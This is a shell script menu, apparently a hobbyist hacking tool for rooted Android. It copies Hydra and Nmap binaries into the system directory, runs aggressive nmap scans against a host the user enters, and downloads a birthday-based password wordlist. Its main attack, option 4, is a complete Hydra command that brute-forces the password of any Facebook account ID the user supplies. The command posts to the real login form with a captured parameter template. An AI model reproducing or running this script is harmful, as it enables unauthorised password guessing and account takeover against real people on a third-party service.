clear
echo -e "\033[31m           0000\033[0m_____________0000________0000000000000000__000000000000000000+\n\033[31m         00000000\033[0m_________00000000______000000000000000__0000000000000000000+\n\033[31m        000\033[0m____000_______000____000_____000_______0000__00______0+\n\033[31m       000\033[0m______000_____000______000_____________0000___00______0+\n\033[31m      0000\033[0m______0000___0000______0000___________0000_____0_____0+\n\033[31m      0000\033[0m______0000___0000______0000__________0000___________0+\n\033[31m      0000\033[0m______0000___0000______0000_________000___0000000000+\n\033[31m      0000\033[0m______0000___0000______0000________0000+\n\033[31m       000\033[0m______000_____000______000________0000+\n\033[31m        000\033[0m____000_______000____000_______00000+\n\033[31m         00000000\033[0m_________00000000_______0000000+\n\033[31m           0000\033[0m_____________0000________000000007;"
echo "Website: thedevevil.blogspot.com"
echo "Facebook: www.facebook.com/thedevevil "
echo "CHOSSE By nEmBer and push Enter "
echo -e "\e[32m ^1^Install Hydra with pw-inspecter"
echo -e "\e[32m ^2^Install Nmap"
echo -e "\e[32m ^3^Scan Host Ports |Range Alsoo| "
echo -e "\e[32m ^4^Hack Facebook with hydra"
echo -e "^5^ Download wordlists "
read cls
case $cls in
	1)
echo "Installing Hydra on Your device "
cd Tools
echo -e "[#    ]"
cp hydra /system/xbin/
echo -e "[###  ]"
cp pw-inspector /system/xbin/
echo -e "[#####] successfully install hydra run it with command *hydra*"
cd ..
    ;;
    2)
echo "Installing nmap on Your device"
cd Tools
echo -e "[#       ]"
cp nmap /system/xbin/
echo -e "[###]"
cp nmap-4.01-1.spec /system/xbin/ 
echo -e "[####    ]"
cp nmap-mac-prefixes /system/xbin/
echo -e "[#####   ]"
cp nmap-os-fingerprints /system/xbin/
echo -e "[######  ]"
cp nmap-protocols /system/xbin/
echo -e "[####### ]"
cp nmap-rpc /system/xbin/
echo -e "[####### ]"
cp nmap-service-probes /system/xbin/
echo -e "[####### ]"
cp nmap-services /system/xbin/
echo -e "[########]"
echo -e "[#####] successfully install nmap run it with command *nmap* "
cd ..
    ;;
    3)
echo "Put Host YOU want to Scan Ex: scanme.host.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 and push Enter"
read host
echo "Scanning The Host with Nmap "
nmap -v -A $host
echo "Done"
    ;;
    4)
echo "Pust Facebook id Here and push Enter"
read Face
echo "Put wordlist path and push Enter"
read wordlist
echo Now Bruteforcing $Face with $wordlist
hydra -l $Face -P $wordlist -t 1 -W 15 -v -V fr-fr.facebook.com https-post-form "/login.php?login_attempt=1&lwv=100:
lsd=AVq2DYuR&display=&enable_profile_selector=&isprivate=&legacy_return=1&profile_selector_ids=&skip_api_login=&signed_next=&trynum=2&timezone=-120&lgndim=eyJ3IjoxNjAwLCJoIjo5MDAsImF3IjoxNjAwLCJhaCI6ODczLCJjIjoyNH0%3D&lgnrnd=123248_Alo7&lgnjs=1465500766&email=^USER^&pass=^PASS^&persistent=&default_persistent=1&qsstamp=W1tbMTksMzAsNDAsNDEsNDcsNTIsNjIsNjUsODgsOTksMTExLDE0NywyNDAsMjU1LDI2MCwyNjMsMjY4LDI3
NiwzMDMsMzA0LDMyOCwzMzUsMzczLDM4OSwzOTMsNDA0LDQzNiw0NDUsNDUwLDQ3OSw0ODIsNDg1LDUwNiw1MjYs
NTM5LDU0OCw1NzUsNTkzLDYwNSw2NjUsNjcyLDcyMl1dLCJBWm5rMnpRUnRTZks5d2h3RzlGWGh3TGpSVEUtQ0R0Z3
M1SDBoUXhCajNSVlU0ZWxLWEs0NVh2TVFTWnVsRlRtQUNKcHZvRE5hLVYtZ1doZVgxWUJVZ0d0d2xtOG9EeW1IbnA3Sj
dPUlBXSGFJd3VRMmloeURxYm1nd2d6T3NVTnY4Ym9aQzBYdlRrNjhzN0VuVE1LQnhWN21DXzhyMS13bTdPYU05SG9laW
FIRHROS0FqTnlmNUJ2WjdyYTM2S3pBQVNXQk1GVkVSVzVMcVNFY1doczdtSmNpUHN2WV9SMHpiU1p6R0FzVm5iakRlWW
04WENvWkJuX3ZRakswSGRMX3hVIl0%3
:F=incorrect"
    ;;
    5)
echo "Downloading a wordlist"
wget https://raw.githubusercontent.com/MaMo-ben/Wibr-/master/woslists/birthday.txt
echo "[########]"
    ;;
esac
